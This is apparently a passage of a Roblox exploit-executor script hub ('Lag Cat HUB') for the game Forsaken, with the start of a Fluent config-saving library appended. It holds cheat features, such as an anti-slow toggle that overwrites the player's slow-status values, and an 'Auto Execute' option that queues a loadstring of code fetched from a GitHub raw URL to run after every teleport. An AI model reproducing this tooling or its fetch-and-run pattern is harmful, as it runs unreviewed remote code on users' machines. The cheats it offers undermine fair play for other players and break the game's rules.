7448 |     local Workspace = game:GetService("Workspace")
7449 | 
7450 |     Tabs.Misc:AddToggle("AutoClosePopupV2", {
7451 |         Title = "Detele 1x Popups",
7452 |         Default = true
7453 |     }):OnChanged(function(Value)
7454 |         DoLoop = Value
7455 | 
7456 |         task.spawn(function()
7457 |             local Survivors = Workspace:WaitForChild("Players"):WaitForChild("Survivors")
7458 | 
7459 |             while DoLoop and task.wait() do
7460 |                 -- üîπ Auto Close 1x1x1x1 Popups
7461 |                 local temp = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("TemporaryUI")
7462 |                 if temp and temp:FindFirstChild("1x1x1x1Popup") then
7463 |                     temp["1x1x1x1Popup"]:Destroy()
7464 |                 end
7465 | 
7466 |                 -- üîπ Anti Slow + Anti FOV Slow
7467 |                 for _, survivor in pairs(Survivors:GetChildren()) do
7468 |                     if survivor:GetAttribute("Username") == LocalPlayer.Name then
7469 |                         -- SpeedMultipliers
7470 |                         local speedMultipliers = survivor:FindFirstChild("SpeedMultipliers")
7471 |                         if speedMultipliers then
7472 |                             local val = speedMultipliers:FindFirstChild("SlowedStatus")
7473 |                             if val and val:IsA("NumberValue") then
7474 |                                 val.Value = 1
7475 |                             end
7476 |                         end
7477 | 
7478 |                         -- FOVMultipliers
7479 |                         local fovMultipliers = survivor:FindFirstChild("FOVMultipliers")
7480 |                         if fovMultipliers then
7481 |                             local val = fovMultipliers:FindFirstChild("SlowedStatus")
7482 |                             if val and val:IsA("NumberValue") then
7483 |                                 val.Value = 1
7484 |                             end
7485 |                         end
7486 |                     end
7487 |                 end
7488 |             end
7489 |         end)
7490 |     end)
7491 | end
7492 | 
7493 | 
7494 | 
7495 |     Tabs.Misc:AddSection("Fix Lag")
7496 | 
7497 | -- SCRIPT GI·∫¢M ƒê·ªí H·ªåA T·ª∞ ƒê·ªòNG M·ªñI 10 GI√ÇY (C√ì TOGGLE + RESTORE)
7498 | -- D√°n v√†o LocalScript (StarterPlayerScripts ho·∫∑c executor)
7499 | -- Si√™u Fix Lag c·ª±c m·∫°nh gi√∫p m√°y b·∫°n m∆∞·ª£t h∆°n 25% khi b·∫≠t
7500 | 
7501 | -- L∆∞u d·ªØ li·ªáu g·ªëc
7502 | local originalLighting = {}
7503 | local originalParts = {}
7504 | 
7505 | -- H√†m l∆∞u Lighting g·ªëc
7506 | local function saveLighting()
7507 |     originalLighting.QualityLevel = settings().Rendering.QualityLevel
7508 |     originalLighting.GlobalShadows = game.Lighting.GlobalShadows
7509 |     originalLighting.FogEnd = game.Lighting.FogEnd
7510 |     originalLighting.Brightness = game.Lighting.Brightness
7511 |     originalLighting.PostEffects = {}
7512 |     for _, v in ipairs(game.Lighting:GetChildren()) do
7513 |         if v:IsA("PostEffect") then
7514 |             originalLighting.PostEffects[v] = v.Enabled
7515 |         end
7516 |     end
7517 | end
7518 | 
7519 | -- H√†m kh√¥i ph·ª•c Lighting
7520 | local function restoreLighting()
7521 |     if not originalLighting.QualityLevel then return end
7522 |     settings().Rendering.QualityLevel = originalLighting.QualityLevel
7523 |     game.Lighting.GlobalShadows = originalLighting.GlobalShadows
7524 |     game.Lighting.FogEnd = originalLighting.FogEnd
7525 |     game.Lighting.Brightness = originalLighting.Brightness
7526 |     for effect, state in pairs(originalLighting.PostEffects) do
7527 |         if effect and effect.Parent == game.Lighting then
7528 |             effect.Enabled = state
7529 |         end
7530 |     end
7531 | end
7532 | 
7533 | -- H√†m gi·∫£m ƒë·ªì h·ªça tri·ªát ƒë·ªÉ
7534 | local function simplifyModel(obj)
7535 |     if obj:IsA("BasePart") then
7536 |         if not originalParts[obj] then
7537 |             originalParts[obj] = {
7538 |                 Material = obj.Material,
7539 |                 Color = obj.Color,
7540 |                 Reflectance = obj.Reflectance,
7541 |                 CastShadow = obj.CastShadow
7542 |             }
7543 |         end
7544 |         obj.Material = Enum.Material.SmoothPlastic
7545 |         obj.Color = Color3.fromRGB(163, 162, 165)
7546 |         obj.Reflectance = 0
7547 |         obj.CastShadow = false
7548 |     elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("SurfaceAppearance") then
7549 |         obj:Destroy()
7550 |     elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
7551 |         obj.Enabled = false
7552 |     end
7553 | end
7554 | 
7555 | -- H√†m kh√¥i ph·ª•c BasePart
7556 | local function restoreParts()
7557 |     for part, data in pairs(originalParts) do
7558 |         if part and part.Parent then
7559 |             part.Material = data.Material
7560 |             part.Color = data.Color
7561 |             part.Reflectance = data.Reflectance
7562 |             part.CastShadow = data.CastShadow
7563 |         end
7564 |     end
7565 |     originalParts = {} -- reset
7566 | end
7567 | 
7568 | -- ==============================
7569 | -- Toggle Auto Reduce (10s)
7570 | -- ==============================
7571 | local autoThread
7572 | local connection
7573 | 
7574 | local AutoReduceToggle = Tabs.Misc:AddToggle("AutoReduce", {
7575 |     Title = "FPS Boost",
7576 |     Default = false,
7577 |     Callback = function(state)
7578 |         if state then
7579 |             print("üîÑ Auto Reduce ON")
7580 | 
7581 |             -- L∆∞u lighting g·ªëc
7582 |             saveLighting()
7583 | 
7584 |             -- Gi·∫£m ƒë·ªì h·ªça lighting khi b·∫≠t
7585 |             settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
7586 |             game.Lighting.GlobalShadows = false
7587 |             game.Lighting.FogEnd = 9e9
7588 |             game.Lighting.Brightness = 1
7589 |             for _, v in ipairs(game.Lighting:GetChildren()) do
7590 |                 if v:IsA("PostEffect") then
7591 |                     v.Enabled = false
7592 |                 end
7593 |             end
7594 | 
7595 |             -- üî• Gi·∫£m ngay 1 l·∫ßn ƒë·∫ßu ti√™n
7596 |             for _, obj in ipairs(workspace:GetDescendants()) do
7597 |                 simplifyModel(obj)
7598 |             end
7599 | 
7600 |             -- N·∫øu c√≥ object spawn th√™m th√¨ c≈©ng x·ª≠ l√Ω
7601 |             connection = workspace.DescendantAdded:Connect(simplifyModel)
7602 | 
7603 |             -- Sau ƒë√≥ auto l·∫∑p m·ªói 10s
7604 |             autoThread = task.spawn(function()
7605 |                 while AutoReduceToggle.Value do
7606 |                     task.wait(10)
7607 |                     for _, obj in ipairs(workspace:GetDescendants()) do
7608 |                         simplifyModel(obj)
7609 |                     end
7610 |                 end
7611 |             end)
7612 | 
7613 |         else
7614 |             print("‚èπ Auto Reduce OFF")
7615 |             if connection then
7616 |                 connection:Disconnect()
7617 |                 connection = nil
7618 |             end
7619 | 
7620 |             -- Kh√¥i ph·ª•c ƒë·ªì h·ªça g·ªëc
7621 |             restoreLighting()
7622 |             restoreParts()
7623 |             print("‚úÖ ƒê√£ kh√¥i ph·ª•c ƒë·ªì h·ªça g·ªëc")
7624 |         end
7625 |     end
7626 | })
7627 | 
7628 | 
7629 | 
7630 | -- üß† Anti-FPS Spike (C∆∞·ª°ng ch·∫ø 60FPS + T·ª± ch·ªëng tƒÉng b·∫•t th∆∞·ªùng)
7631 | -- Gi·ªØ FPS lu√¥n ·ªïn ƒë·ªãnh ·ªü 60, ngƒÉn v·ªçt FPS g√¢y ƒë∆° / gi·∫≠t game
7632 | 
7633 | local RunService = game:GetService("RunService")
7634 | 
7635 | Tabs.Misc:AddToggle("AntiFPSSpike", {
7636 |     Title = "Unlock FPS V2",
7637 |     Default = false
7638 | }):OnChanged(function(Value)
7639 |     _G.AntiFPSSpike = Value
7640 | 
7641 |     if Value then
7642 |         warn("[Anti-FPS Spike] ‚úÖ H·ªá th·ªëng c∆∞·ª°ng ch·∫ø FPS = 60 ƒë√£ b·∫≠t.")
7643 | 
7644 |         task.spawn(function()
7645 |             local FORCE_FPS = 60          -- Lu√¥n gi·ªØ 60 FPS
7646 |             local SPIKE_THRESHOLD = 120   -- N·∫øu FPS v∆∞·ª£t ng∆∞·ª°ng n√†y th√¨ ch·ªëng spike
7647 |             local MONITOR_INTERVAL = 1    -- Ki·ªÉm tra m·ªói 1 gi√¢y
7648 | 
7649 |             local frameCount = 0
7650 |             local fps = 60
7651 | 
7652 |             -- H√†m c∆∞·ª°ng ch·∫ø FPS
7653 |             local function forceCap()
7654 |                 if typeof(setfpscap) == "function" then
7655 |                     setfpscap(FORCE_FPS)
7656 |                 end
7657 |             end
7658 | 
7659 |             -- Kh√≥a ban ƒë·∫ßu
7660 |             forceCap()
7661 | 
7662 |             -- ƒê·∫øm FPS th·ª±c t·∫ø
7663 |             RunService.RenderStepped:Connect(function()
7664 |                 if not _G.AntiFPSSpike then return end
7665 |                 frameCount += 1
7666 |             end)
7667 | 
7668 |             while _G.AntiFPSSpike and task.wait(MONITOR_INTERVAL) do
7669 |                 fps = frameCount / MONITOR_INTERVAL
7670 |                 frameCount = 0
7671 | 
7672 |                 -- Ph√°t hi·ªán FPS tƒÉng b·∫•t th∆∞·ªùng
7673 |                 if fps > SPIKE_THRESHOLD then
7674 |                     warn(string.format("[‚ö†Ô∏è Anti-FPS Spike]: FPS tƒÉng b·∫•t th∆∞·ªùng (%d) ‚Üí ·ªïn ƒë·ªãnh l·∫°i!", math.floor(fps)))
7675 |                     forceCap()
7676 |                     task.wait(0.5)
7677 |                 end
7678 | 
7679 |                 -- B·∫£o v·ªá tr√°nh script kh√°c ƒë·ªïi cap
7680 |                 if typeof(getfpscap) == "function" then
7681 |                     local currentCap = getfpscap()
7682 |                     if currentCap ~= FORCE_FPS then
7683 |                         warn("[Anti-FPS Spike]: Ph√°t hi·ªán thay ƒë·ªïi FPS cap ngo√†i √Ω mu·ªën ‚Üí √©p l·∫°i 60FPS.")
7684 |                         forceCap()
7685 |                     end
7686 |                 end
7687 |             end
7688 | 
7689 |             warn("[Anti-FPS Spike] ‚õî H·ªá th·ªëng c∆∞·ª°ng ch·∫ø FPS ƒë√£ t·∫Øt.")
7690 |         end)
7691 |     else
7692 |         warn("[Anti-FPS Spike] ‚ùå ƒê√£ t·∫Øt.")
7693 |     end
7694 | end)
7695 | 
7696 | 
7697 | 
7698 | -- ======= D·ªäCH V·ª§ =======
7699 | local Players = game:GetService("Players")
7700 | local LocalPlayer = Players.LocalPlayer
7701 | 
7702 | -- ======= DANH S√ÅCH BLOCK ANIMATION =======
7703 | local blockedAnimations = {
7704 |     ["127802146383565"] = true,
7705 |     ["82691533602949"] = true,
7706 |     ["123764169071995"] = true,
7707 | }
7708 | 
7709 | -- ======= BI·∫æN TR·∫†NG TH√ÅI =======
7710 | local BlockAnimEnabled = false
7711 | local blockConnections = {}
7712 | 
7713 | -- ======= H√ÄM =======
7714 | local function hookHumanoid(humanoid)
7715 |     if not humanoid then return end
7716 |     local conn = humanoid.AnimationPlayed:Connect(function(track)
7717 |         local id = track.Animation.AnimationId:match("%d+")
7718 |         if BlockAnimEnabled and blockedAnimations[id] then
7719 |             track:Stop()
7720 |         end
7721 |     end)
7722 |     table.insert(blockConnections, conn)
7723 | end
7724 | 
7725 | local function setBlockAnimations(enabled)
7726 |     BlockAnimEnabled = enabled
7727 | 
7728 |     -- clear c≈©
7729 |     for _, conn in pairs(blockConnections) do
7730 |         conn:Disconnect()
7731 |     end
7732 |     table.clear(blockConnections)
7733 | 
7734 |     if enabled then
7735 |         -- nh√¢n v·∫≠t hi·ªán t·∫°i
7736 |         if LocalPlayer.Character then
7737 |             hookHumanoid(LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"))
7738 |         end
7739 |         -- respawn
7740 |         local connChar = LocalPlayer.CharacterAdded:Connect(function(char)
7741 |             char:WaitForChild("Humanoid")
7742 |             hookHumanoid(char:FindFirstChildWhichIsA("Humanoid"))
7743 |         end)
7744 |         table.insert(blockConnections, connChar)
7745 |     end
7746 | end
7747 | 
7748 | -- ======= TOGGLE FLUENT =======
7749 | Tabs.Misc:AddToggle("BlockBadAnims", {
7750 |     Title = "Block Animations",
7751 |     Default = false
7752 | }):OnChanged(function(v)
7753 |     setBlockAnimations(v)
7754 | end)
7755 | 
7756 | 
7757 | 
7758 |     Tabs.Misc:AddSection("Show")
7759 | 
7760 | 
7761 | 
7762 | --// FPS + Ping Display (Safe BillboardGui Version)
7763 | local RunService = game:GetService("RunService")
7764 | local Stats = game:GetService("Stats")
7765 | local Camera = workspace.CurrentCamera
7766 | 
7767 | --// UI Container
7768 | local ui = Instance.new("ScreenGui")
7769 | ui.Name = "FPS_Ping_Display"
7770 | ui.ResetOnSpawn = false
7771 | ui.IgnoreGuiInset = true
7772 | ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
7773 | ui.Parent = game:GetService("CoreGui")
7774 | 
7775 | --// FPS Label
7776 | local fpsLabel = Instance.new("TextLabel")
7777 | fpsLabel.Size = UDim2.new(0, 120, 0, 20)
7778 | fpsLabel.Position = UDim2.new(1, -130, 0, 5)
7779 | fpsLabel.BackgroundTransparency = 1
7780 | fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
7781 | fpsLabel.TextStrokeTransparency = 0
7782 | fpsLabel.TextSize = 16
7783 | fpsLabel.Font = Enum.Font.Code
7784 | fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
7785 | fpsLabel.Text = "FPS: ..."
7786 | fpsLabel.Parent = ui
7787 | 
7788 | --// Ping Label
7789 | local pingLabel = fpsLabel:Clone()
7790 | pingLabel.Position = UDim2.new(1, -130, 0, 25)
7791 | pingLabel.Text = "Ping: ..."
7792 | pingLabel.Parent = ui
7793 | 
7794 | --// Variables
7795 | local showFPS = true
7796 | local showPing = true
7797 | local fpsCounter, lastUpdate = 0, tick()
7798 | 
7799 | --// Update Loop
7800 | RunService.RenderStepped:Connect(function()
7801 |     fpsCounter += 1
7802 |     if tick() - lastUpdate >= 1 then
7803 |         if showFPS then
7804 |             fpsLabel.Visible = true
7805 |             fpsLabel.Text = "FPS: " .. tostring(fpsCounter)
7806 |         else
7807 |             fpsLabel.Visible = false
7808 |         end
7809 | 
7810 |         if showPing then
7811 |             local pingStat = Stats.Network.ServerStatsItem["Data Ping"]
7812 |             local ping = pingStat and math.floor(pingStat:GetValue()) or 0
7813 |             pingLabel.Text = "Ping: " .. ping .. " ms"
7814 |             if ping <= 60 then
7815 |                 pingLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
7816 |             elseif ping <= 120 then
7817 |                 pingLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
7818 |             else
7819 |                 pingLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
7820 |             end
7821 |             pingLabel.Visible = true
7822 |         else
7823 |             pingLabel.Visible = false
7824 |         end
7825 | 
7826 |         fpsCounter = 0
7827 |         lastUpdate = tick()
7828 |     end
7829 | end)
7830 | 
7831 | --// Fluent UI Toggles
7832 | local fpsToggle = Tabs.Misc:AddToggle("ShowFPSToggle", {
7833 |     Title = "Show FPS",
7834 |     Default = true
7835 | })
7836 | fpsToggle:OnChanged(function(val)
7837 |     showFPS = val
7838 |     fpsLabel.Visible = val
7839 | end)
7840 | 
7841 | local pingToggle = Tabs.Misc:AddToggle("ShowPingToggle", {
7842 |     Title = "Show Ping",
7843 |     Default = true
7844 | })
7845 | pingToggle:OnChanged(function(val)
7846 |     showPing = val
7847 |     pingLabel.Visible = val
7848 | end)
7849 | 
7850 | 
7851 | 
7852 | 
7853 | do
7854 |     --== üí¨ Chat Visibility Controller ==--
7855 |     getgenv().chatWindow = game:GetService("TextChatService"):WaitForChild("ChatWindowConfiguration")
7856 |     getgenv().chatEnabled = false
7857 |     getgenv().chatConnection = nil
7858 | 
7859 |     Tabs.Misc:AddToggle("ChatVisibilityToggle", {
7860 |         Title = "Show Chat",
7861 |         Default = false
7862 |     }):OnChanged(function(Value)
7863 |         getgenv().chatEnabled = Value
7864 | 
7865 |         -- N·∫øu b·∫≠t ‚Üí b·∫≠t chat v√† k·∫øt n·ªëi Heartbeat
7866 |         if Value then
7867 |             if not getgenv().chatConnection then
7868 |                 getgenv().chatConnection = game:GetService("RunService").Heartbeat:Connect(function()
7869 |                     if getgenv().chatWindow then
7870 |                         getgenv().chatWindow.Enabled = true
7871 |                     end
7872 |                 end)
7873 |             end
7874 |         else
7875 |             -- N·∫øu t·∫Øt ‚Üí ng·∫Øt k·∫øt n·ªëi v√† ·∫©n chat
7876 |             if getgenv().chatConnection then
7877 |                 getgenv().chatConnection:Disconnect()
7878 |                 getgenv().chatConnection = nil
7879 |             end
7880 |             if getgenv().chatWindow then
7881 |                 getgenv().chatWindow.Enabled = false
7882 |             end
7883 |         end
7884 |     end)
7885 | end
7886 | 
7887 | 
7888 | 
7889 | 
7890 | -- Tabs.Settings
7891 | 
7892 | 
7893 | local AexecToggle = Tabs.Settings:AddToggle("AexecToggle", {Title = "Auto Execute", Default = false })
7894 | AexecToggle:OnChanged(function(Value)
7895 |     if Value then
7896 |         task.spawn(function()
7897 |             pcall(function()
7898 |                 if queue_on_teleport then
7899 |                     local HutaoHubScript1 = [[
7900 | task.wait(3)
7901 | loadstring(game:HttpGet("https://raw.githubusercontent.com/hdksakst-ship-it/Hutao-Hub-Omega-X/refs/heads/main/Forsaken-v3.txt"))()
7902 | ]]
7903 |                     queue_on_teleport(HutaoHubScript1)
7904 |                 end
7905 |             end)
7906 |         end)
7907 |         Fluent:Notify({
7908 |             Title = "Lag Cat HUB",
7909 |             Content = "Auto execute is enabled!",
7910 |             Duration = 5
7911 |         })
7912 |     else
7913 |         Fluent:Notify({
7914 |             Title = "Lag Cat HUB",
7915 |             Content = "Auto execute is disabled!",
7916 |             Duration = 5
7917 |         })
7918 |     end
7919 | end)
7920 | 
7921 | SaveManager:SetLibrary(Fluent)
7922 | InterfaceManager:SetLibrary(Fluent)
7923 | 
7924 | -- Ignore keys that are used by ThemeManager.
7925 | -- (we dont want configs to save themes, do we?)
7926 | SaveManager:IgnoreThemeSettings()
7927 | 
7928 | -- You can add indexes of elements the save manager should ignore
7929 | SaveManager:SetIgnoreIndexes({})
7930 | 
7931 | -- use case for doing it this way:
7932 | -- a script hub could have themes in a global folder
7933 | -- and game configs in a separate folder per game
7934 | InterfaceManager:SetFolder("Lag Cat HUB")
7935 | SaveManager:SetFolder("Lag Cat HUB/Forsaken")
7936 | 
7937 | InterfaceManager:BuildInterfaceSection(Tabs.Settings)
7938 | SaveManager:BuildConfigSection(Tabs.Settings)
7939 | 
7940 | -- Select First Tab By Default
7941 | Window:SelectTab(1)
7942 | 
7943 | Fluent:Notify({ Title = "Lag Cat HUB", Content = "forsaken script loaded successfully!", Duration = 5 })
7944 | SaveManager:LoadAutoloadConfig()
7945 | 
7946 | 
7947 | -- üü¢ DRAGGABLE UI BUTTON WITH ENHANCED CLICK AND HOVER ANIMATIONS
7948 | local UserInputService = game:GetService("UserInputService")
7949 | local CoreGui = game:GetService("CoreGui")
7950 | local TweenService = game:GetService("TweenService")
7951 | 
7952 | -- X√≥a n·∫øu c√≥ UI minimize c≈©
7953 | local ExistingUI = CoreGui:FindFirstChild("HutaoHubMinimizeUI")
7954 | if ExistingUI then
7955 |     ExistingUI:Destroy()
7956 | end
7957 | 
7958 | -- Create Floating UI
7959 | local DragUI = Instance.new("ScreenGui")
7960 | DragUI.Name = "HutaoHubMinimizeUI"
7961 | DragUI.ResetOnSpawn = false
7962 | DragUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
7963 | DragUI.Parent = CoreGui
7964 | 
7965 | -- Create Circular Button
7966 | local Button = Instance.new("ImageButton")
7967 | Button.Parent = DragUI
7968 | Button.Size = UDim2.new(0, 50, 0, 50)
7969 | Button.Position = UDim2.new(0, 10, 1, -85)
7970 | Button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
7971 | Button.BackgroundTransparency = 0.3
7972 | Button.BorderSizePixel = 0
7973 | Button.ClipsDescendants = true
7974 | Button.Image = "rbxassetid://72597850320651" -- Thay icon n·∫øu mu·ªën
7975 | Button.ScaleType = Enum.ScaleType.Fit
7976 | Button.Active = true
7977 | Button.ZIndex = 1000
7978 | 
7979 | -- Make UI Circular
7980 | local UICorner = Instance.new("UICorner")
7981 | UICorner.CornerRadius = UDim.new(1, 0)
7982 | UICorner.Parent = Button
7983 | 
7984 | -- Tween Info for Animations
7985 | local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
7986 | 
7987 | -- üü¢ Toggle Fluent UI tr·ª±c ti·∫øp
7988 | local function ToggleUI()
7989 |     if Window.Minimized then
7990 |         Window:Minimize(false) -- m·ªü l·∫°i
7991 |     else
7992 |         Window:Minimize(true) -- thu nh·ªè
7993 |     end
7994 | end
7995 | 
7996 | -- Click Animation & UI Toggle
7997 | local isDragging = false
7998 | local dragThreshold = 10
7999 | 
8000 | Button.MouseButton1Click:Connect(function()
8001 |     if isDragging then return end
8002 | 
8003 |     -- Click animation
8004 |     TweenService:Create(Button, tweenInfo, {
8005 |         BackgroundTransparency = 0.5,
8006 |         Size = UDim2.new(0, 45, 0, 45),
8007 |         Rotation = 5
8008 |     }):Play()
8009 |     task.wait(0.1)
8010 |     TweenService:Create(Button, tweenInfo, {
8011 |         BackgroundTransparency = 0.3,
8012 |         Size = UDim2.new(0, 50, 0, 50),
8013 |         Rotation = 0
8014 |     }):Play()
8015 | 
8016 |     ToggleUI()
8017 | end)
8018 | 
8019 | -- Hover Animation
8020 | Button.MouseEnter:Connect(function()
8021 |     TweenService:Create(Button, tweenInfo, {Size = UDim2.new(0, 55, 0, 55)}):Play()
8022 | end)
8023 | 
8024 | Button.MouseLeave:Connect(function()
8025 |     TweenService:Create(Button, tweenInfo, {Size = UDim2.new(0, 50, 0, 50)}):Play()
8026 | end)
8027 | 
8028 | -- Dragging Logic for PC & Mobile
8029 | local dragging, dragStart, startPos
8030 | 
8031 | local function StartDrag(input)
8032 |     isDragging = false
8033 |     dragging = true
8034 |     dragStart = input.Position
8035 |     startPos = Button.Position
8036 | 
8037 |     input.Changed:Connect(function()
8038 |         if input.UserInputState == Enum.UserInputState.End then
8039 |             dragging = false
8040 |         end
8041 |     end)
8042 | end
8043 | 
8044 | local function OnDrag(input)
8045 |     if dragging then
8046 |         local delta = (input.Position - dragStart).Magnitude
8047 |         if delta > dragThreshold then
8048 |             isDragging = true
8049 |         end
8050 |         Button.Position = UDim2.new(
8051 |             startPos.X.Scale,
8052 |             startPos.X.Offset + (input.Position.X - dragStart.X),
8053 |             startPos.Y.Scale,
8054 |             startPos.Y.Offset + (input.Position.Y - dragStart.Y)
8055 |         )
8056 |     end
8057 | end
8058 | 
8059 | -- Dragging Support
8060 | Button.InputBegan:Connect(function(input)
8061 |     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
8062 |         StartDrag(input)
8063 |     end
8064 | end)
8065 | 
8066 | Button.InputChanged:Connect(function(input)
8067 |     if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
8068 |         OnDrag(input)
8069 |     end
8070 | end)  
   1 | local httpService = game:GetService("HttpService")
   2 | 
   3 | local SaveManager = {} do
   4 | 	SaveManager.Folder = "FluentSettings"
   5 | 	SaveManager.Ignore = {}
   6 | 	SaveManager.Parser = {
   7 | 		Toggle = {
   8 | 			Save = function(idx, object) 
   9 | 				return { type = "Toggle", idx = idx, value = object.Value } 
  10 | 			end,
  11 | 			Load = function(idx, data)
  12 | 				if SaveManager.Options[idx] then 
  13 | 					SaveManager.Options[idx]:SetValue(data.value)
  14 | 				end
  15 | 			end,
  16 | 		},
  17 | 		Slider = {
  18 | 			Save = function(idx, object)
  19 | 				return { type = "Slider", idx = idx, value = tostring(object.Value) }
  20 | 			end,
  21 | 			Load = function(idx, data)
  22 | 				if SaveManager.Options[idx] then 
  23 | 					SaveManager.Options[idx]:SetValue(data.value)
  24 | 				end
  25 | 			end,
  26 | 		},
  27 | 		Dropdown = {
  28 | 			Save = function(idx, object)
  29 | 				return { type = "Dropdown", idx = idx, value = object.Value, mutli = object.Multi }
  30 | 			end,
  31 | 			Load = function(idx, data)
  32 | 				if SaveManager.Options[idx] then 
  33 | 					SaveManager.Options[idx]:SetValue(data.value)
  34 | 				end
  35 | 			end,
  36 | 		},
  37 | 		Colorpicker = {
  38 | 			Save = function(idx, object)
  39 | 				return { type = "Colorpicker", idx = idx, value = object.Value:ToHex(), transparency = object.Transparency }
  40 | 			end,
  41 | 			Load = function(idx, data)
  42 | 				if SaveManager.Options[idx] then 
  43 | 					SaveManager.Options[idx]:SetValueRGB(Color3.fromHex(data.value), data.transparency)
  44 | 				end
  45 | 			end,
  46 | 		},
  47 | 		Keybind = {
  48 | 			Save = function(idx, object)
  49 | 				return { type = "Keybind", idx = idx, mode = object.Mode, key = object.Value }
  50 | 			end,
  51 | 			Load = function(idx, data)
  52 | 				if SaveManager.Options[idx] then 
  53 | 					SaveManager.Options[idx]:SetValue(data.key, data.mode)
  54 | 				end
  55 | 			end,
  56 | 		},
  57 | 
  58 | 		Input = {
  59 | 			Save = function(idx, object)
  60 | 				return { type = "Input", idx = idx, text = object.Value }
  61 | 			end,
  62 | 			Load = function(idx, data)
  63 | 				if SaveManager.Options[idx] and type(data.text) == "string" then
  64 | 					SaveManager.Options[idx]:SetValue(data.text)
  65 | 				end
  66 | 			end,
  67 | 		},
  68 | 	}
  69 | 
  70 | 	function SaveManager:SetIgnoreIndexes(list)
  71 | 		for _, key in next, list do
  72 | 			self.Ignore[key] = true
  73 | 		end
  74 | 	end
  75 | 
  76 | 	function SaveManager:SetFolder(folder)
  77 | 		self.Folder = folder;
  78 | 		self:BuildFolderTree()
  79 | 	end
  80 | 
  81 | 	function SaveManager:Save(name)
  82 | 		if (not name) then
  83 | 			return false, "no config file is selected"
  84 | 		end
  85 | 
  86 | 		local fullPath = self.Folder .. "/settings/" .. name .. ".json"
  87 | 
  88 | 		local data = {
  89 | 			objects = {}
  90 | 		}
  91 | 
  92 | 		for idx, option in next, SaveManager.Options do
  93 | 			if not self.Parser[option.Type] then continue end
  94 | 			if self.Ignore[idx] then continue end
  95 | 
  96 | 			table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
  97 | 		end	
  98 | 
  99 | 		local success, encoded = pcall(httpService.JSONEncode, httpService, data)
 100 | 		if not success then
 101 | 			return false, "failed to encode data"
 102 | 		end
 103 | 
 104 | 		writefile(fullPath, encoded)
 105 | 		return true
 106 | 	end
 107 | 
 108 | 	function SaveManager:Load(name)
 109 | 		if (not name) then
 110 | 			return false, "no config file is selected"
 111 | 		end
 112 | 		
 113 | 		local file = self.Folder .. "/settings/" .. name .. ".json"
 114 | 		if not isfile(file) then return false, "invalid file" end
 115 | 
 116 | 		local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(file))
 117 | 		if not success then return false, "decode error" end
 118 | 
 119 | 		for _, option in next, decoded.objects do
 120 | 			if self.Parser[option.type] then
 121 | 				task.spawn(function() self.Parser[option.type].Load(option.idx, option) end) -- task.spawn() so the config loading wont get stuck.
 122 | 			end
 123 | 		end
 124 | 
 125 | 		return true
 126 | 	end
 127 | 
 128 | 	function SaveManager:IgnoreThemeSettings()
 129 | 		self:SetIgnoreIndexes({ 
 130 | 			"InterfaceTheme", "AcrylicToggle", "TransparentToggle", "MenuKeybind"
 131 | 		})
 132 | 	end
 133 | 
 134 | 	function SaveManager:BuildFolderTree()
 135 | 		local paths = {
 136 | 			self.Folder,
 137 | 			self.Folder .. "/settings"
 138 | 		}
 139 | 
 140 | 		for i = 1, #paths do
 141 | 			local str = paths[i]
 142 | 			if not isfolder(str) then
 143 | 				makefolder(str)
 144 | 			end
 145 | 		end
 146 | 	end
 147 | 
 148 | 	function SaveManager:RefreshConfigList()
 149 | 		local list = listfiles(self.Folder .. "/settings")
 150 | 
 151 | 		local out = {}
 152 | 		for i = 1, #list do
 153 | 			local file = list[i]
 154 | 			if file:sub(-5) == ".json" then
 155 | 				local pos = file:find(".json", 1, true)
 156 | 				local start = pos
 157 | 
 158 | 				local char = file:sub(pos, pos)
 159 | 				while char ~= "/" and char ~= "\\" and char ~= "" do
 160 | 					pos = pos - 1
 161 | 					char = file:sub(pos, pos)
 162 | 				end
 163 | 
 164 | 				if char == "/" or char == "\\" then
 165 | 					local name = file:sub(pos + 1, start - 1)
 166 | 					if name ~= "options" then
 167 | 						table.insert(out, name)
 168 | 					end
 169 | 				end
 170 | 			end
 171 | 		end
 172 | 		
 173 | 		return out
 174 | 	end
 175 | 
 176 | 	function SaveManager:SetLibrary(library)
 177 | 		self.Library = library
 178 |         self.Options = library.Options
 179 | 	end
 180 | 
 181 | 	function SaveManager:LoadAutoloadConfig()
 182 | 		if isfile(self.Folder .. "/settings/autoload.txt") then
 183 | 			local name = readfile(self.Folder .. "/settings/autoload.txt")
 184 | 
 185 | 			local success, err = self:Load(name)
 186 | 			if not success then
 187 | 				return self.Library:Notify({
 188 | 					Title = "Interface",
 189 | 					Content = "Config loader",
 190 | 					SubContent = "Failed to load autoload config: " .. err,
 191 | 					Duration = 7
 192 | 				})
 193 | 			end
 194 | 
 195 | 			self.Library:Notify({
 196 | 				Title = "Interface",
 197 | 				Content = "Config loader",
 198 | 				SubContent = string.format("Auto loaded config %q", name),
 199 | 				Duration = 7
 200 | 			})
 201 | 		end
 202 | 	end
 203 | 
 204 | 	function SaveManager:BuildConfigSection(tab)
 205 | 		assert(self.Library, "Must set SaveManager.Library")
 206 | 
 207 | 		local section = tab:AddSection("Configuration")
 208 | 
 209 | 		section:AddInput("SaveManager_ConfigName",    { Title = "Config name" })
 210 | 		section:AddDropdown("SaveManager_ConfigList", { Title = "Config list", Values = self:RefreshConfigList(), AllowNull = true })
 211 | 
 212 | 		section:AddButton({
 213 |             Title = "Create config",
 214 |             Callback = function()
 215 |                 local name = SaveManager.Options.SaveManager_ConfigName.Value
